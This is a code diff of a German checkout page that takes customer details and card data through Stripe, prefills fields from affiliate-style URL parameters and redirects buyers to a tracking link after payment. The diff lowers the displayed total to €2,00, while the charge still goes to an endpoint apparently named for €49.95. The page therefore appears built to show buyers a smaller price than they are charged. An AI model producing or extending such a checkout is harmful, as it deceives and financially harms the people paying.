@@ -57,42 +57,28 @@
     .trust{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;text-align:center}
     .tiny{font-size:12px;color:var(--muted)}
 
-.loading-overlay{
-  position:fixed;inset:0;
-  background:rgba(246,249,252,.92);
-  display:none;align-items:center;justify-content:center;
-  z-index:9999;
-}
-.loading-overlay[aria-hidden="false"]{display:flex}
-
-.loading-box{
-  width:min(92vw,460px);
-  background:#fff;
-  border:1px solid #e6edf5;
-  border-radius:14px;
-  padding:24px;
-  text-align:center;
-  box-shadow:0 6px 18px rgba(0,0,0,0.06);
-}
-.loading-title{
-  font-size:20px;font-weight:800;margin-bottom:18px
-}
-.progress-wrap{
-  width:100%;height:12px;background:#ecf1f8;
-  border-radius:999px;overflow:hidden
-}
-.progress-bar{
-  width:0%;height:100%;
-  background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
-  animation:loadingBar 2.2s ease-in-out infinite
-}
-@keyframes loadingBar{
-  0%{width:0%}
-  60%{width:80%}
-  100%{width:100%}
-}
-
-
+    /* loading overlay */
+    .loading-overlay{
+      position:fixed; inset:0;
+      background:rgba(246,249,252,.92);
+      display:none; align-items:center; justify-content:center;
+      z-index:9999;
+    }
+    .loading-overlay[aria-hidden="false"]{display:flex}
+    .loading-box{
+      width:min(92vw,460px); background:#fff;
+      border:1px solid #e6edf5; border-radius:14px;
+      box-shadow:0 6px 18px rgba(0,0,0,.06);
+      padding:20px; text-align:center;
+    }
+    .loading-title{font-weight:800;margin:2px 0 10px;font-size:18px}
+    .progress-wrap{width:100%;height:10px;background:#ecf1f8;border-radius:999px;overflow:hidden}
+    .progress-bar{
+      width:0%;height:100%;
+      background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
+      animation:loadingBar 2.2s ease-in-out infinite;
+    }
+    @keyframes loadingBar{0%{width:0%}60%{width:80%}100%{width:100%}}
   </style>
 </head>
 
@@ -123,53 +109,30 @@
         <div class="h2">1. Angaben</div>
 
         <div class="form-grid">
-          <div>
-            <div class="label">Vorname</div>
-            <input id="firstName" class="input">
-          </div>
-          <div>
-            <div class="label">Nachname</div>
-            <input id="lastName" class="input">
-          </div>
+          <div><div class="label">Vorname</div><input id="firstName" class="input"></div>
+          <div><div class="label">Nachname</div><input id="lastName" class="input"></div>
         </div>
 
         <div class="form-grid">
-          <div style="grid-column:1/-1">
-            <div class="label">Adresse</div>
-            <input id="billingStreet" class="input">
-          </div>
-          <div>
-            <div class="label">Postleitzahl</div>
-            <input id="billingPostcode" class="input">
-          </div>
-          <div>
-            <div class="label">Stadt</div>
-            <input id="billingCity" class="input">
-          </div>
+          <div style="grid-column:1/-1"><div class="label">Adresse</div><input id="billingStreet" class="input"></div>
+          <div><div class="label">Postleitzahl</div><input id="billingPostcode" class="input"></div>
+          <div><div class="label">Stadt</div><input id="billingCity" class="input"></div>
         </div>
 
         <div class="form-grid">
-          <div>
-            <div class="label">E-Mail</div>
-            <input id="emailInput" class="input">
-          </div>
-          <div>
-            <div class="label">Land</div>
-            <input id="billingCountry" class="input" value="Deutschland">
-          </div>
+          <div><div class="label">E-Mail</div><input id="emailInput" class="input"></div>
+          <div><div class="label">Land</div><input id="billingCountry" class="input" value="Deutschland"></div>
         </div>
 
         <div class="form-grid">
           <div>
             <div class="label">Ländervorwahl</div>
             <select id="phonePrefix" class="select">
-              <option value="+49">+49 — Deutschland</option>
-            </select>
+  <option value="+49">+49 — Deutschland</option>
+</select>
+
           </div>
-          <div>
-            <div class="label">Telefonnummer</div>
-            <input id="phoneNumber" class="input">
-          </div>
+          <div><div class="label">Telefonnummer</div><input id="phoneNumber" class="input"></div>
         </div>
 
         <input id="nameInput" style="display:none">
@@ -177,10 +140,7 @@
         <button id="nextBtn" class="btn">Weiter</button>
 
         <div class="logos">
-          <img src="/visa.png">
-          <img src="mastercard.png">
-          <img src="amex.png">
-          <img src="discover.jpg">
+          <img src="/visa.png"><img src="mastercard.png"><img src="amex.png"><img src="discover.jpg">
         </div>
       </section>
 
@@ -217,16 +177,13 @@
       <div class="widget">
         <div class="delivery">
           <img id="sidebarImg">
-          <div>
-            <div style="font-weight:800">Schnelle Lieferung</div>
-            <div class="tiny">3–5 Werktage</div>
-          </div>
+          <div><div style="font-weight:800">Schnelle Lieferung</div><div class="tiny">3–5 Werktage</div></div>
           <div style="margin-left:auto;font-weight:800">Kostenlos</div>
         </div>
 
         <div style="font-weight:800;margin-top:12px">Bestellübersicht</div>
         <div style="display:flex;justify-content:space-between">
-          <span>Gesamt</span><span>€9.99</span>
+          <span>Gesamt</span><span>€2,00</span>
         </div>
       </div>
 
@@ -242,130 +199,79 @@
   </div>
 </div>
 
-<div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+<div id="loading-overlay" class="loading-overlay" aria-hidden="true" style="display:none">
   <div class="loading-box">
     <div class="loading-title">Zahlung wird verarbeitet…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
     <p class="tiny" style="margin-top:10px">
-      Bitte warten Sie einen Moment…
+      Bitte warten, dies kann einige Sekunden dauern.
     </p>
   </div>
 </div>
-
 
 <script src="https://js.stripe.com/v3"></script>
 <script>
 window.addEventListener('DOMContentLoaded', () => {
 
-  const qs = new URLSearchParams(location.search);
-  const d = v => { try{return decodeURIComponent(v||'')}catch{return v||''} };
+  const qs=new URLSearchParams(location.search);
+const hero = document.getElementById('hero');
+const heroTitle = document.getElementById('heroTitle');
+const heroImg = document.getElementById('heroImg');
+const sidebarImg = document.getElementById('sidebarImg');
 
-  const hero=document.getElementById('hero');
-  const heroTitle=document.getElementById('heroTitle');
-  const heroImg=document.getElementById('heroImg');
-  const sidebarImg=document.getElementById('sidebarImg');
+  const d=v=>{try{return decodeURIComponent(v||'')}catch{return v||''}};
 
-  if(qs.get('sub1')){ heroTitle.textContent=d(qs.get('sub1')); hero.style.display='flex'; }
-  if(qs.get('sub2')){ heroImg.src=d(qs.get('sub2')); sidebarImg.src=d(qs.get('sub2')); hero.style.display='flex'; }
+  if(qs.get('sub1')){heroTitle.textContent=d(qs.get('sub1'));hero.style.display='flex'}
+  if(qs.get('sub2')){heroImg.src=d(qs.get('sub2'));sidebarImg.src=d(qs.get('sub2'));hero.style.display='flex'}
 
-  const map={
-    sub3:'firstName',sub4:'lastName',sub5:'billingStreet',
-    sub6:'billingPostcode',sub7:'billingCity',sub8:'billingCountry',
-    sub9:'emailInput',sub10:'phoneNumber'
-  };
-  Object.entries(map).forEach(([k,id])=>{
-    const el=document.getElementById(id); if(el&&qs.get(k)) el.value=d(qs.get(k));
-  });
-
-  const step1=document.getElementById('step1');
-  const step2=document.getElementById('step2');
-  document.getElementById('nextBtn').onclick=()=>{
-    document.getElementById('nameInput').value=
-      (firstName.value+' '+lastName.value).trim();
-    step1.setAttribute('aria-hidden','true');
-    step2.setAttribute('aria-hidden','false');
-  };
-  document.getElementById('backBtn').onclick=()=>{
-    step2.setAttribute('aria-hidden','true');
-    step1.setAttribute('aria-hidden','false');
-  };
+  nextBtn.onclick=()=>{nameInput.value=(firstName.value+' '+lastName.value).trim();step1.setAttribute('aria-hidden','true');step2.setAttribute('aria-hidden','false')}
+  backBtn.onclick=()=>{step2.setAttribute('aria-hidden','true');step1.setAttribute('aria-hidden','false')}
 
   const stripe=Stripe("pk_live_51T3DMAAC1AZtWXWqdUQpq4e708hWDC8eixOTIwLOlR7IIF60tiyLEum1CxQiwVbPECrKV8VoHwZfFmTDTpRiqsU300dIpubyaT");
   const elements=stripe.elements();
-  const cn=elements.create('cardNumber'); cn.mount('#card-number');
-  const ce=elements.create('cardExpiry'); ce.mount('#card-expiry');
-  const cc=elements.create('cardCvc'); cc.mount('#card-cvc');
+  const cn=elements.create('cardNumber');cn.mount('#card-number');
+  const ce=elements.create('cardExpiry');ce.mount('#card-expiry');
+  const cc=elements.create('cardCvc');cc.mount('#card-cvc');
 
-  document.getElementById('payNow').onclick = async () => {
-
-  const payBtn = document.getElementById('payNow');
-  const err = document.getElementById('err');
-  const overlay = document.getElementById("loading-overlay");
-
-  payBtn.disabled = true;
-  err.setAttribute("aria-hidden","true");
-  overlay.setAttribute("aria-hidden","false");
-
-  try {
-
-  // ✅ ADD THIS BLOCK RIGHT HERE
-  const billingDetails = {
-    name: firstName.value + " " + lastName.value,
-    email: emailInput.value,
-    phone: phonePrefix.value + phoneNumber.value,
+  payNow.onclick=async()=>{
+    const overlay=document.getElementById('loading-overlay');
+    payNow.disabled=true; err.setAttribute('aria-hidden','true');
+    overlay.style.display='flex'; overlay.setAttribute('aria-hidden','false');
+    try{
+      const pm = await stripe.createPaymentMethod({
+  type: 'card',
+  card: cn,
+  billing_details: {
+    name: nameInput.value || undefined,
+    email: emailInput.value || undefined,
+    phone: (phonePrefix.value + phoneNumber.value) || undefined,
     address: {
-      line1: billingStreet.value,
-      city: billingCity.value,
-      postal_code: billingPostcode.value,
-      country: "DE"
+      line1: billingStreet.value || undefined,
+      city: billingCity.value || undefined,
+      postal_code: billingPostcode.value || undefined,
+      country: 'DE'
+    }
+  }
+});
+
+      const r = await fetch("/api/stripe/s3/one-time-49-95",{
+
+method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({paymentMethodId:pm.paymentMethod.id})});
+      const dta=await r.json();
+      const result = await stripe.confirmCardPayment(dta.clientSecret);
+
+      if (result.error) {
+        throw result.error;
+      }
+
+        location.href =
+          'https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7';
+      
+    }catch(e){
+      err.textContent=e.message;err.setAttribute('aria-hidden','false');
+      payNow.disabled=false;overlay.style.display='none';overlay.setAttribute('aria-hidden','true');
     }
   };
-
-  // ✅ MODIFY THIS
-  const pm = await stripe.createPaymentMethod({
-    type:'card',
-    card:cn,
-    billing_details: billingDetails
-  });
-
-  if (pm.error) throw pm.error;
-
-  // ✅ MODIFY THIS
-  const r = await fetch("/api/stripe/s3/one-time-49-95",{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      paymentMethodId: pm.paymentMethod.id,
-      name: billingDetails.name,
-      email: billingDetails.email,
-      phone: billingDetails.phone,
-      address: billingDetails.address
-    })
-  });
-
-      
-    const dta = await r.json();
-
-    const result = await stripe.confirmCardPayment(dta.clientSecret);
-
-    if (result.error) throw result.error;
-
-    if (!result.paymentIntent || result.paymentIntent.status !== 'succeeded') {
-      throw new Error('Payment not completed');
-    }
-
-    location.href='https://cudsr.bemobtrcks.com/go/a0224109-84eb-47be-926c-e1a7232611a7?';
-
-  } catch(e){
-
-    err.textContent = e.message;
-    err.setAttribute('aria-hidden','false');
-
-    payBtn.disabled = false;
-    overlay.setAttribute("aria-hidden","true");
-  }
-};
-
 });
 </script>
 </body>
